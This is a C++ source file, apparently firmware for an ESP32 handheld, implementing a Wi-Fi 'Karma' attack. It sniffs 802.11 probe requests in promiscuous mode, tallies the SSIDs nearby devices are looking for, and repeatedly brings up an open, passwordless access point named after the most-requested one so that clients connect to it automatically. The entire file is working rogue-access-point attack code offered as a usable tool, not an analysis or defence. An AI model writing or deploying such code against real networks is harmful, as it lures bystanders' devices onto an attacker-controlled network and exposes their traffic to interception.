#include "KarmaAttackActivity.h"

#include <GfxRenderer.h>
#include <WiFi.h>
#include <esp_wifi.h>

#include <algorithm>
#include <cstring>

#include "MappedInputManager.h"
#include "components/UITheme.h"
#include "fontIds.h"

KarmaAttackActivity* KarmaAttackActivity::activeInstance = nullptr;

// ── 802.11 probe-request frame layout (minimal parse) ──────────────────────
// We only need the SSID from the management frame body.
// Management frame: FC(2) | Dur(2) | DA(6) | SA(6) | BSSID(6) | SC(2) | Body
// Body for probe-request starts with Information Elements.
// IE: Tag(1) | Len(1) | Data(Len)  — SSID IE tag = 0x00

struct __attribute__((packed)) Dot11MgmtHdr {
  uint16_t frameCtrl;
  uint16_t duration;
  uint8_t da[6];
  uint8_t sa[6];
  uint8_t bssid[6];
  uint16_t seqCtrl;
};

static constexpr uint16_t FC_PROBE_REQUEST = 0x0040;
static constexpr uint8_t IE_SSID = 0x00;

// ── Lifecycle ────────────────────────────────────────────────────────────────

void KarmaAttackActivity::onEnter() {
  Activity::onEnter();
  probeCount = 0;
  scrollOffset = 0;
  memset(probes, 0, sizeof(probes));
  memset(activeApSsid, 0, sizeof(activeApSsid));
  running = false;
  phase = Phase::IDLE;
  activeInstance = this;
  requestUpdate();
}

void KarmaAttackActivity::onExit() {
  stopSniff();
  stopAp();
  activeInstance = nullptr;
  WiFi.mode(WIFI_OFF);
  Activity::onExit();
}

// ── Main loop ────────────────────────────────────────────────────────────────

void KarmaAttackActivity::loop() {
  if (mappedInput.wasPressed(MappedInputManager::Button::Back)) {
    finish();
    return;
  }

  // Up / Down scroll the probe list
  if (mappedInput.wasPressed(MappedInputManager::Button::Down)) {
    if (scrollOffset < probeCount - 1) {
      scrollOffset++;
      requestUpdate();
    }
  }
  if (mappedInput.wasPressed(MappedInputManager::Button::Up)) {
    if (scrollOffset > 0) {
      scrollOffset--;
      requestUpdate();
    }
  }

  // Confirm toggles running
  if (mappedInput.wasPressed(MappedInputManager::Button::Confirm)) {
    running = !running;
    if (!running) {
      stopSniff();
      stopAp();
      activeApSsid[0] = '\0';
      phase = Phase::IDLE;
    } else {
      startSniff();
    }
    requestUpdate();
    return;
  }

  if (!running) return;

  unsigned long now = millis();

  if (phase == Phase::SNIFF && (now - phaseStart) >= SNIFF_MS) {
    stopSniff();
    const char* best = bestSsid();
    if (best) {
      startAp(best);
    } else {
      // No probes seen yet — sniff again
      startSniff();
    }
    requestUpdate();
  } else if (phase == Phase::AP && (now - phaseStart) >= AP_MS) {
    stopAp();
    startSniff();
    requestUpdate();
  }
}

// ── Render ───────────────────────────────────────────────────────────────────

void KarmaAttackActivity::render(RenderLock&&) {
  renderer.clearScreen();

  const auto& metrics = UITheme::getInstance().getMetrics();
  const auto pageWidth = renderer.getScreenWidth();
  const auto pageHeight = renderer.getScreenHeight();

  const char* subtitle = "";
  if (phase == Phase::SNIFF) subtitle = "SNIFFING";
  else if (phase == Phase::AP) subtitle = activeApSsid[0] ? activeApSsid : "AP ACTIVE";

  GUI.drawHeader(renderer, Rect{0, metrics.topPadding, pageWidth, metrics.headerHeight},
                 "Karma Attack", subtitle);

  const int x = metrics.contentSidePadding;
  const int lineH = renderer.getLineHeight(SMALL_FONT_ID) + 4;
  const int contentTop = metrics.topPadding + metrics.headerHeight + metrics.verticalSpacing;
  const int contentBottom = pageHeight - metrics.buttonHintsHeight - metrics.verticalSpacing;
  const int visibleLines = (contentBottom - contentTop) / lineH;

  if (probeCount == 0) {
    renderer.drawCenteredText(UI_10_FONT_ID, (contentTop + contentBottom) / 2,
                              running ? "Waiting for probes..." : "Press [SELECT] to start");
  } else {
    int y = contentTop;
    for (int i = scrollOffset; i < probeCount && i < scrollOffset + visibleLines; i++) {
      char line[48];
      snprintf(line, sizeof(line), "%3d  %s", probes[i].count, probes[i].ssid);
      renderer.drawText(SMALL_FONT_ID, x, y, line);
      y += lineH;
    }
  }

  // Status bar bottom line
  if (phase == Phase::AP && activeApSsid[0]) {
    char apLine[48];
    snprintf(apLine, sizeof(apLine), "AP: \"%s\"", activeApSsid);
    renderer.drawText(SMALL_FONT_ID, x, contentBottom - lineH, apLine);
  }

  const char* btn2 = running ? "Stop" : "Start";
  const auto labels = mappedInput.mapLabels("Back", btn2, "^", "v");
  GUI.drawButtonHints(renderer, labels.btn1, labels.btn2, labels.btn3, labels.btn4);

  renderer.displayBuffer();
}

// ── Promiscuous callback (runs in WiFi driver task) ───────────────────────────

void IRAM_ATTR KarmaAttackActivity::promiscuousCallback(void* buf,
                                                         wifi_promiscuous_pkt_type_t type) {
  if (type != WIFI_PKT_MGMT) return;
  if (!activeInstance) return;

  const wifi_promiscuous_pkt_t* pkt = static_cast<const wifi_promiscuous_pkt_t*>(buf);
  const uint8_t* payload = pkt->payload;
  const uint16_t len = pkt->rx_ctrl.sig_len;

  if (len < sizeof(Dot11MgmtHdr) + 2) return;

  const auto* hdr = reinterpret_cast<const Dot11MgmtHdr*>(payload);
  if ((hdr->frameCtrl & 0x00FC) != FC_PROBE_REQUEST) return;  // not a probe-req

  // Walk IEs in the body
  const uint8_t* ie = payload + sizeof(Dot11MgmtHdr);
  const uint8_t* end = payload + len;
  while (ie + 2 <= end) {
    uint8_t tag = ie[0];
    uint8_t elen = ie[1];
    if (ie + 2 + elen > end) break;
    if (tag == IE_SSID && elen > 0 && elen <= 32) {
      char ssid[33] = {};
      memcpy(ssid, ie + 2, elen);
      ssid[elen] = '\0';
      // Avoid broadcast probes (empty SSID)
      if (ssid[0] != '\0') {
        activeInstance->recordProbe(ssid);
      }
    }
    ie += 2 + elen;
  }
}

// ── Private helpers ───────────────────────────────────────────────────────────

void KarmaAttackActivity::startSniff() {
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(promiscuousCallback);
  phase = Phase::SNIFF;
  phaseStart = millis();
  LOG_DBG("KARMA", "Sniff phase started");
}

void KarmaAttackActivity::stopSniff() {
  if (phase != Phase::SNIFF) return;
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(nullptr);
  phase = Phase::IDLE;
  LOG_DBG("KARMA", "Sniff phase stopped");
}

void KarmaAttackActivity::startAp(const char* ssid) {
  strncpy(activeApSsid, ssid, 32);
  activeApSsid[32] = '\0';

  WiFi.mode(WIFI_AP);
  // Open AP (no password) on channel 1; SSID matches what the client probed for.
  WiFi.softAP(activeApSsid, nullptr, 1, false /* hidden */, 4 /* max clients */);

  phase = Phase::AP;
  phaseStart = millis();
  LOG_DBG("KARMA", "AP started: \"%s\"", activeApSsid);
}

void KarmaAttackActivity::stopAp() {
  if (phase != Phase::AP) return;
  WiFi.softAPdisconnect(true);
  activeApSsid[0] = '\0';
  phase = Phase::IDLE;
  LOG_DBG("KARMA", "AP stopped");
}

void KarmaAttackActivity::recordProbe(const char* ssid) {
  // Update existing entry
  for (int i = 0; i < probeCount; i++) {
    if (strncmp(probes[i].ssid, ssid, 32) == 0) {
      probes[i].count++;
      return;
    }
  }
  // Add new entry
  if (probeCount < MAX_PROBES) {
    strncpy(probes[probeCount].ssid, ssid, 32);
    probes[probeCount].ssid[32] = '\0';
    probes[probeCount].count = 1;
    probeCount++;
  }
}

const char* KarmaAttackActivity::bestSsid() const {
  if (probeCount == 0) return nullptr;
  int best = 0;
  for (int i = 1; i < probeCount; i++) {
    if (probes[i].count > probes[best].count) best = i;
  }
  return probes[best].ssid;
}
